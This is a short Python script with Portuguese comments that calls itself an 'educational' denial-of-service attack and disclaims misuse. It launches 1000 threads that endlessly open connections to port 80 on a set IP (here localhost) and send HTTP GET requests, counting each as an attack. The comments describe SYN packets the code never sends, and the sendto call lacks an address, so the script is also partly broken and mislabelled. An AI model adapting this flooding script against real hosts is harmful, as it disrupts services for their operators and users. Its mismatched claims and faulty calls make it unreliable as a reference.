# Código para realizar um ataque DoS em um dado IP; para fins educacionais.
# O código foi escrito para fins educacionais. Não sou responsável por qualquer uso indevido.
# Use por sua conta e risco.

# O codigo cria um socket e envia pacotes SYN para o IP de destino. Utilizando
# Threads para enviar os pacotes, o que torna o ataque mais eficiente.

# Importando as bibliotecas necessárias

import socket
import threading

attack_cont = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 80))
        s.sendto(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n")
        resp = s.recv(4096)

        global attack_cont
        attack_cont += 1
        print("Attack number:", attack_cont)
        s.close()


for i in range(1000):
    t = threading.Thread(target=attack)
    t.start()
